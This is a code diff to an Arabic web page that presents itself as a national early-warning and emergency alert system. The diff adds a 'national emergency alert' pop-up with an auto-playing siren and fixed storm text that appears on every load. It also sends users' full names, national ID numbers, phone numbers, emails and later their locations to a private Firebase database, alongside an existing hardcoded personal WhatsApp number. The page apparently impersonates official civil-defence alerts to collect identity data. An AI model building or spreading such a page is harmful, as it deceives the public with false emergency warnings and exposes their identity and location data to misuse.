@@ -9,12 +9,15 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="apple-mobile-web-app-title" content="الإنذار المبكر">
     
-    <!-- ربط ملف المانفست الخارجي لضمان طلب الصلاحيات بكفاءة على الأيفون -->
     <link rel="manifest" href="manifest.json">
     <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/564/564619.png">
     <link rel="apple-touch-icon" href="https://cdn-icons-png.flaticon.com/512/564/564619.png">
 
-    <script src="https://cdn.onesignal.com/sdk/web/v16/OneSignalSDK.page.js" defer></script>
+    <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
+
+    <!-- مكتبات Firebase (نسخة الـ CDN) -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
 
     <style>
         :root {
@@ -44,8 +47,15 @@
         .btn-fire { background: #c0392b; }
         .btn-cancel { background: #95a5a6; }
 
-        input { width: 90%; padding: 11px; margin: 6px 0; border-radius: 8px; border: 1px solid #ddd; background: #fafafa; font-size: 14px; text-align: right; box-sizing: border-box; }
+        input { width: 90%; padding: 11px; margin: 6px 0; border-radius: 8px; border: 1px solid #ddd; background: #fafafa; font-size: 14px; text-align: right; }
         .safety-guide-card { background: #fdfefe; border: 1px solid #e1e8ed; border-right: 4px solid var(--primary-blue); padding: 10px; margin: 8px 0; text-align: right; border-radius: 6px; font-size: 12px; }
+
+        /* نافذة الإنذار المنبثقة (Emergency Modal) */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.75); display: flex; align-items: center; justify-content: center; z-index: 9999; backdrop-filter: blur(5px); }
+        .emergency-modal { background: #fff; width: 85%; max-width: 380px; padding: 25px; border-radius: 20px; text-align: center; border-top: 6px solid #d0021b; box-shadow: 0 15px 35px rgba(208,2,27,0.3); animation: modalAppearing 0.4s ease; }
+        @keyframes modalAppearing { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        .emergency-modal h2 { color: #d0021b; font-size: 20px; margin-bottom: 10px; }
+        .emergency-modal p { font-size: 14px; color: #333; line-height: 1.6; margin-bottom: 20px; }
 
         .hidden { display: none !important; }
         .footer { text-align: center; color: #888; font-size: 11px; line-height: 1.5; margin: 10px 0 20px 0; }
@@ -53,22 +63,32 @@
 </head>
 <body id="pageBody" oncontextmenu="return false;">
 
+    <!-- نافذة الإنذار المنبثقة التلقائية مع صفارة الإنذار -->
+    <div class="modal-overlay" id="emergencyModal">
+        <div class="emergency-modal">
+            <div class="icon-box" style="font-size: 45px; margin-bottom: 5px;">🚨</div>
+            <h2>تنبيه طوارئ وطني</h2>
+            <p id="emergencyText">تتعرض المنطقة لأمطار غزيرة، صواعق رعدية ورياح نشطة قوية، يرجى التصرف بهدوء والبقاء في المنزل أو مكان آمن بعيداً عن النوافذ والأبواب والاستمرار في اتباع تعليمات الدفاع المدني.</p>
+            <button class="btn" onclick="closeEmergencyAlert()" style="background: #27ae60;">تم الاطلاع وفهم التحذير ✅</button>
+        </div>
+    </div>
+
     <div class="ticker-bar">
         <div class="ticker-text">🚨 نظام الطوارئ الذكي وإرشادات السلامة 🛡️</div>
     </div>
 
-    <!-- 1. شاشة تسجيل البيانات (تظهر للمستخدم أول مرة فقط ولا تتكرر نهائياً) -->
+    <!-- 1. شاشة تسجيل البيانات -->
     <div class="container hidden" id="registerUI">
         <div class="icon-box">📝</div>
         <h1>تسجيل بيانات المستخدم</h1>
-        <p>يرجى إدخال بياناتك الشخصية للمتابعة (للمرة الأولى فقط):</p>
+        <p>يرجى إدخال بياناتك الشخصية للمتابعة:</p>
         <input type="text" id="regName" placeholder="الاسم الكامل">
         <input type="number" id="regAge" placeholder="العمر">
         <input type="text" id="regNationality" placeholder="الجنسية">
         <input type="text" id="regIdNumber" placeholder="رقم الهوية">
         <input type="tel" id="regPhone" placeholder="رقم الجوال">
         <input type="email" id="regEmail" placeholder="البريد الإلكتروني">
-        <button class="btn" onclick="saveUserData()">حفظ ومتابعة 🚀</button>
+        <button class="btn" onclick="saveUserData()">حفظ في قاعدة البيانات 🚀</button>
     </div>
 
     <!-- 2. شاشة تفعيل صلاحيات التنبيهات والموقع -->
@@ -122,6 +142,21 @@
     </div>
 
     <script>
+        // إعدادات Firebase الحقيقية الخاصة بك
+        const firebaseConfig = {
+            apiKey: "AIzaSyDXKY3MQLbCRAqQjwVHGYmTVT61Dalpb2g",
+            authDomain: "alaret-e8f2a.firebaseapp.com",
+            projectId: "alaret-e8f2a",
+            storageBucket: "alaret-e8f2a.firebasestorage.app",
+            messagingSenderId: "735569802866",
+            appId: "1:735569802866:web:aa9935ede7a44f9a0c34eb",
+            measurementId: "G-SZR2DC21LG"
+        };
+
+        // تهيئة Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
         window.OneSignalDeferred = window.OneSignalDeferred || [];
         window.OneSignalDeferred.push(async function(OneSignal) {
             await OneSignal.init({
@@ -141,9 +176,58 @@
             } else {
                 document.getElementById('mainMenuUI').classList.remove('hidden');
             }
+
+            // تشغيل صوت صفارة الإنذار المتقطعة فور فتح الصفحة
+            playSirenSound();
         }
 
-        function saveUserData() {
+        let sirenInterval = null;
+
+        // دالة توليد صوت صفارة إنذار الطوارئ المتقطعة برمجياً
+        function playSirenSound() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                
+                function beep() {
+                    if (document.getElementById('emergencyModal').classList.contains('hidden')) return;
+                    
+                    let osc = audioCtx.createOscillator();
+                    let gainNode = audioCtx.createGain();
+                    
+                    osc.type = 'sawtooth'; // صوت صفارة إنذار حاد وقوي
+                    // تذبذب التردد لإعطاء نغمة إنذار واقعية (تصاعد وتنازل)
+                    osc.frequency.setValueAtTime(800, audioCtx.currentTime);
+                    osc.frequency.linearRampToValueAtTime(1200, audioCtx.currentTime + 0.3);
+                    
+                    gainNode.gain.setValueAtTime(0.2, audioCtx.currentTime);
+                    gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
+                    
+                    osc.connect(gainNode);
+                    gainNode.connect(audioCtx.destination);
+                    
+                    osc.start();
+                    osc.stop(audioCtx.currentTime + 0.4);
+                }
+
+                // إطلاق الصفارة كل نصف ثانية بشكل متقطع
+                beep();
+                sirenInterval = setInterval(beep, 600);
+            } catch (e) {
+                console.log("AudioContext blocked or not supported", e);
+            }
+        }
+
+        function closeEmergencyAlert() {
+            // إيقاف صفارة الإنذار عند إغلاق النافذة
+            if (sirenInterval) {
+                clearInterval(sirenInterval);
+                sirenInterval = null;
+            }
+            document.getElementById('emergencyModal').classList.add('hidden');
+        }
+
+        // دالة حفظ البيانات في Firebase Firestore
+        async function saveUserData() {
             const name = document.getElementById('regName').value;
             const age = document.getElementById('regAge').value;
             const nationality = document.getElementById('regNationality').value;
@@ -155,16 +239,31 @@
                 return alert("⚠️ الرجاء تعبئة الحقول الأساسية على الأقل!");
             }
 
-            localStorage.setItem("userRegistered", "true");
-            localStorage.setItem("userName", name);
-            localStorage.setItem("userAge", age);
-            localStorage.setItem("userNationality", nationality);
-            localStorage.setItem("userIdNumber", idNumber);
-            localStorage.setItem("userPhone", phone);
-            localStorage.setItem("userEmail", email || "غير متوفر");
+            try {
+                await db.collection("users").add({
+                    fullName: name,
+                    age: age,
+                    nationality: nationality,
+                    idNumber: idNumber,
+                    phone: phone,
+                    email: email || "غير متوفر",
+                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                });
 
-            document.getElementById('registerUI').classList.add('hidden');
-            document.getElementById('permissionUI').classList.remove('hidden');
+                localStorage.setItem("userRegistered", "true");
+                localStorage.setItem("userName", name);
+                localStorage.setItem("userAge", age);
+                localStorage.setItem("userNationality", nationality);
+                localStorage.setItem("userIdNumber", idNumber);
+                localStorage.setItem("userPhone", phone);
+                localStorage.setItem("userEmail", email || "غير متوفر");
+
+                document.getElementById('registerUI').classList.add('hidden');
+                document.getElementById('permissionUI').classList.remove('hidden');
+            } catch (error) {
+                console.error("خطأ في الحفظ: ", error);
+                alert("حدث خطأ أثناء الاتصال بقاعدة البيانات. تأكد من إعدادات الـ Firebase.");
+            }
         }
 
         function requestPermissions() { 
@@ -213,40 +312,42 @@
 
             const myPhoneNumber = "966500919401"; 
 
+            // حفظ بلاغ الطوارئ في Firebase تحت مجموعة (emergencies)
+            db.collection("emergencies").add({
+                type: typeAr,
+                userName: name,
+                phone: phone,
+                coordinates: `${lat}, ${lng}`,
+                time: timeNow,
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            }).catch(err => console.log(err));
+
             const message = `🚨 *${typeAr}* 🚨%0A` +
-                          `👤 *الاسم:* ${name}%0A` +
-                          `🎂 *العمر:* ${age} | 🌍 *الجنسية:* ${nationality}%0A` +
-                          `🪪 *رقم الهوية:* ${idNumber}%0A` +
-                          `📞 *الجوال:* ${phone}%0A` +
-                          `📧 *الإيميل:* ${email}%0A` +
-                          `📱 *الجهاز:* ${deviceTypeAr}%0A` +
-                          `⏰ *الوقت:* ${timeNow}%0A` +
-                          `🔢 *الإحداثيات:* ${lat}, ${lng}%0A` +
-                          `📍 *رابط الموقع:*%0Ahttps://maps.google.com/?q=${lat},${lng}%0A` +
-                          `⚠️ *أحتاج إلى المساعدة الفورية!*%0A%0A` +
-                          `-----------------------------------%0A` +
-                          `🚨 *${typeEn}* 🚨%0A` +
-                          `👤 *Name:* ${name}%0A` +
-                          `🎂 *Age:* ${age} | 🌍 *Nationality:* ${nationality}%0A` +
-                          `🪪 *ID:* ${idNumber}%0A` +
-                          `📞 *Phone:* ${phone}%0A` +
-                          `📧 *Email:* ${email}%0A` +
-                          `📱 *Device:* ${deviceTypeEn}%0A` +
-                          `⏰ *Time:* ${timeNow}%0A` +
-                          `🔢 *Coordinates:* ${lat}, ${lng}%0A` +
-                          `📍 *Location Link:*%0Ahttps://maps.google.com/?q=${lat},${lng}%0A` +
-                          `⚠️ *I need immediate assistance!*`;
+                        `👤 *الاسم:* ${name}%0A` +
+                        `🎂 *العمر:* ${age} | 🌍 *الجنسية:* ${nationality}%0A` +
+                        `🪪 *رقم الهوية:* ${idNumber}%0A` +
+                        `📞 *الجوال:* ${phone}%0A` +
+                        `📧 *الإيميل:* ${email}%0A` +
+                        `📱 *الجهاز:* ${deviceTypeAr}%0A` +
+                        `⏰ *الوقت:* ${timeNow}%0A` +
+                        `🔢 *الإحداثيات:* ${lat}, ${lng}%0A` +
+                        `📍 *رابط الموقع:*%0Ahttps://maps.google.com/?q=${lat},${lng}%0A` +
+                        `⚠️ *أحتاج إلى المساعدة الفورية!*%0A%0A` +
+                        `-----------------------------------%0A` +
+                        `🚨 *${typeEn}* 🚨%0A` +
+                        `👤 *Name:* ${name}%0A` +
+                        `🎂 *Age:* ${age} | 🌍 *Nationality:* ${nationality}%0A` +
+                        `🪪 *ID:* ${idNumber}%0A` +
+                        `📞 *Phone:* ${phone}%0A` +
+                        `📧 *Email:* ${email}%0A` +
+                        `📱 *Device:* ${deviceTypeEn}%0A` +
+                        `⏰ *Time:* ${timeNow}%0A` +
+                        `🔢 *Coordinates:* ${lat}, ${lng}%0A` +
+                        `📍 *Location Link:*%0Ahttps://maps.google.com/?q=${lat},${lng}%0A` +
+                        `⚠️ *I need immediate assistance!*`;
 
             window.open(`https://wa.me/${myPhoneNumber}?text=${message}`, '_blank');
-
             hideEmergencyOptions();
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    localStorage.setItem("userLat", position.coords.latitude);
-                    localStorage.setItem("userLng", position.coords.longitude);
-                }, () => {});
-            }
         }
     </script>
 </body>
